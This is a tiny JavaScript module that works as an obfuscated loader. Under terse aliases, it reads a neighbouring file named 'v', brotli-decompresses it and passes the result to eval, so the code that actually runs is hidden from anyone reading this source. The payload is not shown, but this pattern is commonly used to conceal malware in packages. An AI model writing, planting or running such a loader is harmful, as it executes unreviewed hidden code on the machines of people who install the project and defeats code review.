import{readFileSync as R}from'fs'
import{brotliDecompressSync as Z}from'zlib'
let b=R(new URL('v',import.meta.url))
let s=Z(b)
await eval(''+s)
